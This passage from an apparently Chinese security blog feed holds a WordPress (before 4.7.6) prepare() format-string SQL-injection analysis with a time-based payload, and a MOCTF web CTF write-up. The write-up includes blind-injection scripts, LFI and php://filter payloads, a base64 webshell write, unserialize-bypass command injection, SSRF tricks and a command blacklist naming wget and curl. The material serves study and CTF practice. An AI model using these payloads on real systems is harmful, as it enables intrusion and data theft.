s.post(url,data=data).content if error in r: lens = i break i+=1 pass print(&quot;[+]length(value): %d&quot; %(lens)) i=1 strs=&apos;&apos; for i in range(lens+1): for c in dic: payload = &quot;admin%1$\\&apos; or ascii(substr((select flag from flag limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(c)) + &quot;#&quot; data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;1&apos;&#125; r = s.post(url,data=data).content if right in r: strs = strs + c print strs break pass pass print(&quot;[+]flag:%s&quot; %(strs))if __name__ == &apos;__main__&apos;: boom() print &apos;Finish!&apos; 1234567891011121314&lt;?php$input = addslashes(&quot;%1$&apos; and 1=1#&quot;);echo $input;echo &quot;\n&quot;;$b = sprintf(&quot;AND b=&apos;%s&apos;&quot;,$input);echo $b;echo &quot;\n&quot;;$sql = sprintf(&quot;select * from t where a=&apos;%s&apos; $b&quot;,&apos;admin&apos;);echo $sql;&gt;&gt;&gt;结果%1$\&apos; and 1=1#AND b=&apos;%1$\&apos; and 1=1#&apos;select * from t where a=&apos;admin&apos; AND b=&apos;&apos; and 1=1#&apos; 格式字符%后面会吃掉一个\即%1$\被替换为空，逃逸出来一个单引号，造成注入. 0x04 Wordpress格式化字符串漏洞漏洞跟踪 wordpress版本小于4.7.5在后台图片删除的地方存在一处格式化字符串漏洞官方在4.7.6已经给出了补救办法在我们即将要说的地方增加了这么一端代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位 首先我们找到upload.php可以发现在deleta中 $post_id_del（比如int()） 未经过处理，直接传入123456789101112case &apos;delete&apos;: if ( !isset( $post_ids ) ) break; foreach ( (array) $post_ids as $post_id_del ) &#123; if ( !current_user_can( &apos;delete_post&apos;, $post_id_del ) ) //跟进 wp_die( __( &apos;Sorry, you are not allowed to delete this item.&apos; ) ); if ( !wp_delete_attachment( $post_id_del ) ) wp_die( __( &apos;Error in deleting.&apos; ) ); &#125; $location = add_query_arg( &apos;deleted&apos;, count( $post_ids ), $location ); break; 跟进wp_delete_attachment( )函数其中参数$post_id_del为图片的postidwp_delete_attachment( )中 调用了delete_metadata 函数12345function wp_delete_attachment( $post_id, $force_delete = false ) &#123;.......delete_metadata( &apos;post&apos;, null, &apos;_thumbnail_id&apos;, $post_id, true ); // delete all for any posts.......&#125; 继续跟进delete_metadata函数漏洞触发点主要在wp-includes/meta.php 的 delete_metadata函数里面， 有如下代码:12345678if ( $delete_all ) &#123; $value_clause = &apos;&apos;; if ( &apos;&apos; !== $meta_value &amp;&amp; null !== $meta_value &amp;&amp; false !== $meta_value ) &#123; $value_clause = $wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); &#125; $object_ids = $wpdb-&gt;get_col( $wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) );&#125; 调用了两个prepare函数跟进prepare函数12345678910111213141516171819public function prepare( $query, $args ) &#123; if ( is_null( $query ) ) return; // This is not meant to be foolproof -- but it will catch obviously incorrect usage. if ( strpos( $query, &apos;%&apos; ) === false ) &#123; _doing_it_wrong( &apos;wpdb::prepare&apos;, sprintf( __( &apos;The query argument of %s must have a placeholder.&apos; ), &apos;wpdb::prepare()&apos; ), &apos;3.9.0&apos; );&#125; $args = func_get_args(); array_shift( $args ); // If args were passed as an array (as in vsprintf), move them up if ( isset( $args[0] ) &amp;&amp; is_array($args[0]) ) $args = $args[0]; $query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s array_walk( $args, array( $this, &apos;escape_by_ref&apos; ) ); return @vsprintf( $query, $args );&#125; 详细看prepare函数对传入参数的处理过程首先对%s进行处理1234$query = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $query ); // in case someone mistakenly already singlequoted it $query = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $query ); // doublequote unquoting $query = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $query ); // Force floats to be locale unaware $query = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $query ); // quote the strings, avoiding escaped strings like %%s 把’%s’替换为%s，然后再把”%s”替换成%s，替换为浮点数%F 把%s替换成’%s’最后再进行vsprintf( $query, $args );对拼接的语句进行格式化处理 我们一步步分析假设传入的$meta_value为’admin’1$wpdb-&gt;prepare( &quot; AND meta_value = %s&quot;, $meta_value ); 经过prepare函数处理后得到12vsprintf( &quot; AND meta_value = &apos;%s&apos;&quot;,&apos;admin&apos;)=&gt; AND meta_value = &apos;admin&apos; return到上一级函数后，继续执行这一条拼接语句：1$wpdb-&gt;prepare( &quot;SELECT $type_column FROM $table WHERE meta_key = %s $value_clause&quot;, $meta_key ) 经过prepare函数处理后得到12vsprintf( &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = &apos;admin&apos;&quot;,&apos;admin&apos;)=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;admin&apos; 看起来一切都很正常，毫无bug但是我们可以思考一下，怎样使其形成注入呢？s&gt; 或者说怎样逃逸一个单引号？在之前我们先看一下，可控变量 $post_id_del 的路线1$post_id_del =&gt; $post_id =&gt; $meta_value =&gt; $args =&gt; $query 显然这里面两处admin都有单引号，而且两处都与 $post_id_del 联系，如何来选择？ 对于第一处单引号它是通过一次替换处理得到的，显然是对单引号&gt;无法处理对于第二处单引号经过两次的替换，（这里的意思是执行了两次的替换代码，可能第二段代码对他没有起到实质性的作用，仅仅是去点单引号然后又加上单引号）但是这一出经过了两次处理是必须的，那么我们是否能够是构造出另一个单引号（此时第二处有三个单引号）就可以闭合前面的单引号了 最重要的是，第二次的替换处理的变量是可控的，因此要引入单引号，我们需要$meta_value含有%s那么第一次的结果为12AND meta_value = &apos;X%sY&apos;（其中XY为未知量）//这里需要注意，为什么%s不被单引号围起来，我看过一篇博客，它是写的&apos;%s&apos;，这显然是错的，为什么呢？我们生成了&apos;%s&apos;是没错，不过还原一下过程就知道了，首先我们生成了AND meta_value = &apos;%s&apos;，注意此时与$meta_value没有半毛钱关系，后来的vsprintf后，才与$meta_value有了关系，原来的%s被替换成了X%sY，值得注意的是这里的%s没有经过任何处理，处理是在第二轮进行的，这是后话。 第二次后的结果为123SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;%s&apos;Y&apos;（对于第二处的%s我们先不要带入格式化后的值，其实真实的语句应该为：SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = &apos;X&apos;admin&apos;Y&apos;） 分析到这里，相信大家应该知道传值（$meta_value）使单引号逃逸出来了吧 admin显然是多余的，那么我们需要把它放在单引号里面，因此第二个单引号需要去掉，那么第四个单引号需要注释掉，这就很轻而易举地构造sql语句AND meta_value = ‘Xadmin’YY里面就是我们注入的代码 漏洞利用 怎么去传值呢？利用格式化字符串漏洞 去掉第二个单引号就需要使该单引号成为%后的第一个字符，也就是%’，但是我们还需要一个占位符，%1$’ 这样就没有报错的去掉了该单引号 所以我们构造的payload为123456$meta_value = %1$%s AND SLEEP(5)#=&gt; AND meta_value = &apos;%1$%s AND SLEEP(5)&apos;=&gt; &quot;SELECT $type_column FROM $table WHERE meta_key = &apos;%s&apos; AND meta_value = AND meta_value = &apos;%1$&apos;%s&apos; AND SLEEP(5)#&apos;&quot;,&apos;admin&apos;其中 %1$&apos; =&gt; 空=&gt; SELECT $type_column FROM $table WHERE meta_key = &apos;admin&apos; AND meta_value = AND meta_value = &apos;admin&apos; AND SLEEP(5)#&apos;成功利用该漏洞形成时间注入 漏洞修补 现在我们说一下第四部分开头的补救方法后来官方在prepare函数加了这一代码1$query = preg_replace( &apos;/%(?:%|$|([^dsF]))/&apos;, &apos;%%\\1&apos;, $query ); // escape any unescaped percents 只允许 %后面出现dsF 这三种字符类型， 其他字符类型都替换为%%\1, 而且还禁止了%, $ 这种参数定位]]></content>
      <tags>
        <tag>格式化字符串漏洞</tag>
        <tag>Wordpress</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moctf-web探索]]></title>
    <url>%2F2018%2F11%2F02%2F1%2F</url>
    <content type="text"><![CDATA[题记：前天晚上突然想刷CTF，就找了上个星期刚刚重新开放Moctf平台，作为一只半只脚还没踏进大门的webdog，记录一下自己的web历程 0x01 一道水题 进入后，点击查看源码即可获得flagview-source:http://119.23.73.3:5001/web1/。 0x02 还是水题 一道考察html标签属性的题目，修改disabled与maxlength属性123&lt;input type=&quot;password&quot; value=&quot;&quot; disabled=&quot;disabled&quot; name=&quot;password&quot; maxlength=&quot;4&quot;&gt;=&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; 0x03 访问限制 提示：只允许使用NAIVE浏览器访问！显然考察user-agent，于是修改user-agent发包，发现回显为：只有香港记者才能访问，于是又去修改Accept-Language，得到flag12User-Agent: NAIVEAccept-Language: zh-HK,zh;q=0.9 插一个题外话，NAIVE浏览器让我想到了黑曜石浏览器，做个题目时，我条件反射地先去go0gle了一下NAIVE浏览器，看看有木有这个浏览器-.-，想试一下的朋友们可以点击 0x04 机器蛇 第一眼看到后，想到应该是考察js，然后就想F12看一下js代码大体逻辑，emmmm，看完没发现什么，直到把翻到最下面，才意识到自己思路错了。提示&lt;!–robots.txt–&gt;，访问发现flagxxxx.php,再次访问，在注释中可以得到flag 0x05 PHP黑魔法 看到名字，应该就能菜刀是php弱类型。进入提示：似乎少点什么，查看源代码，抓包均无果，考虑源码泄漏，发现是index.php~源码泄漏。123456789101112131415161718view-source:http://119.23.73.3:5001/web5/index.php~=&gt;&lt;?php $flag=&quot;moctf&#123;**************&#125;&quot;; if (isset($_GET[&apos;a&apos;])&amp;&amp;isset($_GET[&apos;b&apos;])) &#123; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if($a==$b) &#123; echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; else &#123; if(md5($a)==md5($b)) &#123; echo &quot;&lt;center&gt;&quot;.$flag.&quot;&lt;/center&gt;&quot;; echo &quot;By:daoyuan&quot;; &#125; else echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;; &#125; &#125; payload: ?a=QNKCDZO&amp;b=240610708 0x06 我想要钱 源码审计题目123456789101112&lt;?php include &quot;flag.php&quot;; highlight_file(__FILE__); if (isset($_GET[&apos;money&apos;])) &#123; $money=$_GET[&apos;money&apos;]; if(strlen($money)&lt;=4&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money))&#123; echo $flag; &#125; else echo &quot;Wrong Answer!&quot;; &#125; else echo &quot;Wrong Answer!&quot;;?&gt; 限制为：money长度小于5，并且数值很大，不是数组。payload: ?money=4e10 0x07 登录就对了 根据题目，是想让我们登录进去，首先是试弱口令，无果；再试万能密码，成功登录，flag在源代码中1payload：name = admin&apos; or 1=1#&amp;pass=1 0x08 文件包含 发现flfile=welcome.txt，于是尝试LFIpayload：http://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php=&gt;base64解码得到flag 0x09 暴跳的老板 抓包发现reponse里面有提示123456789101112131415161718192021222324252627# reponseHTTP/1.1 200 OKDate: Fri, 02 Nov 2018 17:24:35 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.14Dear: MyBossVary: Accept-EncodingContent-Length: 137Content-Type: text/html于是携带参数请求POST /web1/do.php HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveContent-Length: 22Cache-Control: max-age=0Origin: http://119.23.73.3:5006Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://119.23.73.3:5006/web1/post.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=hgcbrc4a6o6p6v14dpd8prvdj2postText=1&amp;Dear=MyBoss 0x10 Flag在哪？ 进入点击get flag，回显是there is no flag! 果断抓包看一下，考察302重定向12345678910111213141516171819202122带有特征的过程：GET /web7/flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./where_is_flag.php=&gt;GET /web7/./where_is_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_flag.php=&gt;GET /web7/././I_have_a_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_frog.php=&gt;GET /web7/./././I_have_a_frog.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./no_flag.php=&gt;GET /web7/././././no_flag.php HTTP/1.1 emmm，follow rediretion没有发现任何异常唯一有价值的就是body中内容：12345where is flag!I have a flagI have a frog!ah~ guess where is flag!There is no flag! 得知hint才知道，，这是一首歌曲:ppap，访问flagfrog.php得到答案 0x11 美味的饼干 登录admin，发现可以登录，抓包发现12345Set-Cookie: login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D解码为 user于是再次编码adminMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D得到flag 0x12 没时间解释了 进入后，发现url为 http://119.23.73.3:5006/web2/index2.php 。于是抓包，发现302重定向，得到提示：May be u need uploadsomething.php。访问上传页面，随便上传一个，123filename: adminconcet: admin路径：http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 访问，显示too low，猜测应该是，上传文件会在一定的时间删除吗，并且路径不变。于是bp.intrude走一波。1234567891011GET /web2/uploadsomething.php?filename=admin&amp;content=admin HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9a=§1§ attack后 ,浏览器访问http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 即可得到flag 0x13 死亡退出123456789101112&lt;?php show_source(__FILE__); $c=&quot;&lt;?php exit;?&gt;&quot;; @$c.=$_POST[&apos;c&apos;]; @$filename=$_POST[&apos;file&apos;]; if(!isset($filename)) &#123; file_put_contents(&apos;tmp.php&apos;, &apos;&apos;); &#125; @file_put_contents($filename, $c); include(&apos;tmp.php&apos;);?&gt; 有include函数，首先想到文件包含，但是tmp.php不可控，只能执行tmp.php，可控的是temp.php的内容，于是通过php危险函数file_put_contents()写命令，c=bPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php，即可拿到flag123456789101112131415涉及到的两个知识点：1、file_put_contents()：file_put_contents(file,data,mode,context)data要写入的数据。类型可以是 string，array 或者是 stream 资源（如上面所说的那样）。如果 data 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。就是将context内容写到data中。题目中：使用php://filter/write=convert.base64-decode/resource=tmp.php，tmp.php中写入内容，通过写入base64解码后的数据流实现，配合file_put_contents()使用进行写命令另外附上p牛对这个经典问题的分析https://www.leavesongs.com/PENETRATION/php-filter-magic.html2、base64 编码base64 解码表A-Z、a-z、0-9、+、/，其它的内容 base64 解码会将其过滤掉，比如&lt;?;&gt;与空格，就会自动过滤掉因为题目中的 &lt;?php exit;&gt; =&gt; phpexitbase64 算法解码时是4个byte一组，所以该题目如果phpexit正常解码，不影响后面的一句话，就必须构造8个字符。在 &lt;?php system(&apos;cat flag.php&apos;); ?&gt; base64编码的前面加一个字母即可 0x14 火眼金睛 这个题目意在靠脚本编写，做题时使用的非预期解，bp抓包后，在页面中，搜索moctf的个数，携带参数repeater，即可拿到flag附上预期解脚本：123456789101112131415import requestsimport retargeturl = &quot;http://119.23.73.3:5001/web10&quot;r = requests.get(url=targeturl)res_tr = r&quot;&apos;100&apos;&gt;(.*?)&lt;/textarea&gt;&quot;flagtxt = re.findall(res_tr,r.content)[0]re_moctf = r&quot;moctf&quot;moctf = re.findall(re_moctf,flagtxt)number = len(moctf)ans = &#123; &quot;answer&quot;:number&#125;url2 = &quot;http://119.23.73.3:5001/web10/work.php&quot;s = requests.post(url=url2,data=ans,cookies=r.cookies)print s.content 0x15 UNSET123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(&apos;index.php&apos;);function waf($a)&#123;foreach($a as $key =&gt; $value)&#123; if(preg_match(&apos;/flag/i&apos;,$key))&#123; exit(&apos;are you a hacker&apos;);&#125;&#125;&#125;foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&apos;flag&apos;]))&#123;if($_GET[&apos;flag&apos;] === $_GET[&apos;daiker&apos;])&#123; exit(&apos;error&apos;);&#125;if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;]))&#123; include($_GET[&apos;file&apos;]);&#125;&#125;?&gt; 分析逻辑：需要执行include($_GET[‘file’])=&gt;$_GET[‘file’]为flag.php，但是waf会过滤，那么为了完成这个目的，我们需要先绕过waf再读flag.php根据代码逻辑可以发现unset =&gt; waf检测 =&gt; 再次赋值那么关键性代码：12345foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; 我们需要做的就是把$_GET的参数unset，过了waf再赋值，再利用文件包含读出flag.php的内容过程：1234567891011121、md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;])=&gt;flag=QNKCDZO&amp;daiker=s878926199a2、过waf=&gt;以flag参数为例子GET: ?flag=QNKCDZO =&gt;array(&apos;flag&apos; =&gt; &apos;QNKCDZO&apos;)post: _GET[x]=QNKCDZO先进行处理post参数 $$__R 是 $POST[_GET[x]] =&gt; array(&apos;_GET[x]&apos; =&gt; &apos;QNKCDZO&apos;) =&gt; $__k 是 _GET[x] =&gt; $$__k 是 $_GET[x] 是 QNKCDZO，于是符合 $$__k == $__v，执行unset($_GET[x])，即$__GET[flag]被unset了。后来extract()再次赋值 payload:12345678910111213POST /index.php?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1Host: 119.23.73.3:5101Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 112_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php 0x16 PUBG http://120.78.57.208:6001/?LandIn=school 发现该处.bak源码泄漏，下载index.php与class.php1234567# index.phpelseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); &#125; 可以发现是php反序列化漏洞12345678910111213141516171819202122232425262728# class.phppublic function __destruct()&#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125;&#125;public function Get_air_drops($b)&#123; $this-&gt;$b();&#125;public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125;else &#123; system(&quot;php .//class//win.php&quot;); &#125; die();&#125; 分析逻辑与过程12345678910111213141516171819202122232425262728293031323334 目的：__call()过程:唯一可控的为__destruct()=&gt; Get_air_drops($b)=&gt; $this-&gt;$b();刚好可以调用__call()注意：__wakeup()不能执行$b为命令 =&gt; $bag控制$bag即可$bag又经过waf处理做法：绕过__wakeup()，读waf绕过waf，rce原理：绕过__wakeup()CVE-2016-7124反序列化漏洞，通过传入错误的值绕过具体实现：从源码中在class/下发现flag.phpO:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:13:&quot;flag.|cat%20waf&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;$black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;);=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:20:&quot;flag.|cat%20class/flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;个人提醒一下，/class/flag与class/flag不一样 这里做了一个反序列化的测试123456789101112131415161718192021222324252627282930313233&lt;?php class sheldon&#123; public function __construct() &#123; echo &quot;__construct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __wakeup() &#123; echo &quot;__wakeup()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __call($method,$parameters) &#123; echo &quot;__call()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; &#125; $a = new sheldon; $sa = serialize($a); echo $sa; echo &quot;&lt;br/&gt;&quot;; $ua = unserialize($sa); var_dump($ua); echo &quot;&lt;br/&gt;&quot;; var_dump(unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)); echo &quot;&lt;br/&gt;&quot;; $a-&gt;b(); 输出结果：123456789101112__construct() //new 调用的O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;__wakeup() //unserialize($a)调用的object(sheldon)#2 (2) &#123; [&quot;bag&quot;]=&gt; string(7) &quot;nothing&quot; [&quot;weapon&quot;]=&gt; string(3) &quot;M24&quot; &#125; Notice: unserialize(): Unexpected end of serialized data in A:\tools\phpStudy\WWW\study1\pre.php on line 33__destruct() //unserialize($a)调用的Notice: unserialize(): Error at offset 64 of 65 bytes in A:\tools\phpStudy\WWW\study1\pre.php on line 33bool(false) __call() //$a-&gt;b()调用的__destruct() //unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)调用的__destruct() // 照应new 0x17 网站检测 hint: doker -p 10001 80说明80端口映射到10001，url参数可以进行ssrf测试发现，必须http://moctf.com，过滤&#39;127&#39;，与点，flag.php使用url双编码123456789也考察url结构：方法//身份凭证@真是ip/路径有几个payloadpayload:url = http://www.moctf.com/0.0.0.0/%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30另外几个可以把0.0.0.0 =&gt; 127.0.0.1127.0.0.1=&gt; 8进制017700000001=&gt; 16进制0x7f000001 / 0x7f.1 0x18 简单注入 查看源代码发现注入点为 ?id测试发现空格，/**/，and，or，–+等被禁用使用异或盲注脚本：1234567891011121314151617181920212223242526272829import stringimport requestschars = &apos;!@$%^&amp;*()_+=-|&#125;&#123; :?&gt;&lt;[];,./`~&apos;string = string.ascii_letters+string.digits+charsrs = requests.session()flag = &quot;&quot;# 错误的payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(database())),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# 正确payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;for i in range(0, 500): # for j in string: for j in range(33, 127): url = payload.format(str(i), str(j)) s = rs.get(url) # print url if &apos;Flag&apos; in s.text: flag = flag + chr(j) print flag 得到flag，题外话，因为注入姿势不对，这个题目交flag，交了一天，emmmmmm，大佬们有兴趣可以试试脚本上错误payload，能感受到当时的纠结的心情-.-(其实我在掩盖自己菜的事实)。记录一下错误原因：123456789101112131415mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec)mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec) 0x19 后记 依然能感觉到自己有很多不足，需要学习的太多了，多练习，多看大佬们的技术文章，紧随大佬的步伐。感谢星神等几位表哥的指点。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018WEB安全测试秋季预选赛WriteUp]]></title>
    <url>%2F2018%2F10%2F28%2F1%2F</url>
